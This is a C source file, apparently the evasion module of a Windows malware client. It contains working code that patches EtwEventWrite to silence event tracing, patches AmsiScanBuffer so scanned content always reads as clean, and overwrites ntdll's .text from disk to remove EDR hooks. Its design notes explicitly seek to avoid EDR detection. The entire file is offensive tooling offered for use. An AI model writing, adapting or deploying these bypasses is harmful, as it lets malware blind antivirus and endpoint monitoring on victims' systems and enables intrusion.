/*
 * client/evasion.c  –  User-mode evasion primitives
 * ==================================================
 * See evasion.h for API documentation.
 *
 * Design notes
 * ------------
 *  etw_patch / amsi_patch
 *  ----------------------
 *  Both patch in-process memory by writing a stub via SC_NtWriteVirtualMemory
 *  on the current process handle.  This avoids the VirtualProtect →
 *  PAGE_EXECUTE_READWRITE → write → restore sequence that was the previous
 *  approach: that RWX transition is a high-signal EDR event.
 *
 *  NtWriteVirtualMemory on the current process bypasses the normal page
 *  protection checks for same-process writes on Windows — the kernel
 *  copies the bytes directly without requiring a permission change.
 *  No RWX page ever exists.
 *
 *  unhook_ntdll
 *  ------------
 *  EDR products hook ntdll.dll by overwriting the first few bytes of
 *  syscall stubs with a JMP to their inspection trampoline.  Remapping
 *  the .text section from the on-disk image restores the original stubs.
 *
 *  Steps:
 *    1. Open ntdll path and map it with CreateFileMapping / MapViewOfFile.
 *    2. Locate the .text section header in both the mapped-from-disk copy
 *       and the in-process loaded copy.
 *    3. SC_NtWriteVirtualMemory the disk bytes over the in-process .text —
 *       again, no VirtualProtect / RWX page needed.
 *    4. Unmap / close the disk copy.
 *
 *  NOTE: sc_init() must be called before evasion functions that use
 *  SC_Nt* wrappers (unhook_ntdll, etw_patch, amsi_patch).  In main.c
 *  the call order is: inject_init() [calls sc_init()] → unhook_ntdll()
 *  → etw_patch() → amsi_patch().
 */

#include "evasion.h"
#include "syscall.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winternl.h>
#include <stddef.h>
#include <string.h>


/* ── _patch_self ─────────────────────────────────────────────────────────── */
/*
 * Write `len` bytes from `patch` to `target` in the current process using
 * SC_NtWriteVirtualMemory.  No VirtualProtect, no RWX page.
 *
 * Falls back to the VirtualProtect approach if the syscall engine is not
 * yet initialised (i.e. called before inject_init).
 */
static void _patch_self(void *target, const BYTE *patch, SIZE_T len)
{
    if (sc_ready()) {
        SIZE_T written = 0;
        SC_NtWriteVirtualMemory(GetCurrentProcess(), target,
                                (PVOID)patch, len, &written);
    } else {
        /* Fallback: VirtualProtect (still works, just less stealthy) */
        DWORD old = 0;
        if (VirtualProtect(target, len, PAGE_EXECUTE_READWRITE, &old)) {
            memcpy(target, patch, len);
            VirtualProtect(target, len, old, &old);
        }
    }
}


/* ── etw_patch ───────────────────────────────────────────────────────────── */

void etw_patch(void)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return;

    /* Single-byte RET — callers receive rax=0 (STATUS_SUCCESS) */
    static const BYTE stub[] = { 0xC3 };
    _patch_self((void *)pEtw, stub, sizeof(stub));
}


/* ── amsi_patch ──────────────────────────────────────────────────────────── */

void amsi_patch(void)
{
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScan) return;

    /*
     * xor eax, eax  (S_OK = 0)
     * ret
     * Callers check HRESULT first; S_OK → content treated as clean.
     */
    static const BYTE stub[] = { 0x33, 0xC0, 0xC3 };
    _patch_self((void *)pScan, stub, sizeof(stub));
}


/* ── unhook_ntdll ────────────────────────────────────────────────────────── */

void unhook_ntdll(void)
{
    /* ── 1. Get the on-disk path of the loaded ntdll ─────────────────── */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    WCHAR ntdllPath[MAX_PATH] = {0};
    if (!GetModuleFileNameW(hNtdll, ntdllPath, MAX_PATH - 1)) return;

    /* ── 2. Map the on-disk copy ─────────────────────────────────────── */
    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE,
                                      0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return;

    LPVOID pDisk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!pDisk) return;

    /* ── 3. Find .text section in both images ────────────────────────── */
    IMAGE_DOS_HEADER     *dos  = (IMAGE_DOS_HEADER *)pDisk;
    IMAGE_NT_HEADERS     *nth  = (IMAGE_NT_HEADERS *)((BYTE *)pDisk + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec  = IMAGE_FIRST_SECTION(nth);
    WORD                  nSec = nth->FileHeader.NumberOfSections;

    IMAGE_DOS_HEADER     *ldos = (IMAGE_DOS_HEADER *)hNtdll;
    IMAGE_NT_HEADERS     *lnth = (IMAGE_NT_HEADERS *)((BYTE *)hNtdll + ldos->e_lfanew);
    IMAGE_SECTION_HEADER *lsec = IMAGE_FIRST_SECTION(lnth);

    for (WORD i = 0; i < nSec; i++) {
        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;

        LPVOID pDiskText = (BYTE *)pDisk  + sec[i].VirtualAddress;
        LPVOID pLiveText = (BYTE *)hNtdll + lsec[i].VirtualAddress;
        SIZE_T cbText    = sec[i].Misc.VirtualSize;

        /* Write disk bytes over live .text — no VirtualProtect needed */
        if (sc_ready()) {
            SIZE_T written = 0;
            SC_NtWriteVirtualMemory(GetCurrentProcess(), pLiveText,
                                    pDiskText, cbText, &written);
        } else {
            /* Pre-sc_init fallback */
            DWORD old = 0;
            if (VirtualProtect(pLiveText, cbText, PAGE_EXECUTE_READWRITE, &old)) {
                memcpy(pLiveText, pDiskText, cbText);
                VirtualProtect(pLiveText, cbText, old, &old);
            }
        }
        break;
    }

    UnmapViewOfFile(pDisk);
}
